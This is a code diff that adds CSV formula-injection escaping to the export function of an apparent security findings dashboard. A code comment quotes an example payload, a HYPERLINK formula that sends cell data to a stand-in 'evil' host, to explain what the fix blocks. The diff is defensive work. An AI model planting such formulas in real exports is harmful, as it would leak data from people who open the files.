@@ -610,12 +610,18 @@ function setView(mode) {
   document.getElementById('btn-triage').classList.toggle('active', mode === 'triage');
   document.getElementById('btn-engagement').classList.toggle('active', mode === 'engagement');
 }
+// A cell that starts with = + - @ (or a tab/CR) is run as a FORMULA by Excel and
+// LibreOffice: a finding title like =HYPERLINK("http://evil/?"&A1) would exfiltrate
+// data when the CSV is opened. A leading apostrophe makes it plain text.
+function csvSafe(v) {
+  return /^[=+\\-@\\t\\r]/.test(v) ? "'" + v : v;
+}
 function exportCSV() {
   const rows = [['host','title','severity','status','owasp_category','confidence']];
   document.querySelectorAll('#findings-table tbody tr').forEach(tr => {
     const cells = tr.querySelectorAll('td');
     if (cells.length < 6) return;
-    rows.push(Array.from(cells).slice(0, 6).map(td => '"' + td.textContent.trim().replace(/"/g,'""') + '"'));
+    rows.push(Array.from(cells).slice(0, 6).map(td => '"' + csvSafe(td.textContent.trim()).replace(/"/g,'""') + '"'));
   });
   const csv = rows.map(r => r.join(',')).join('\\n');
   const blob = new Blob([csv], {type: 'text/csv'});
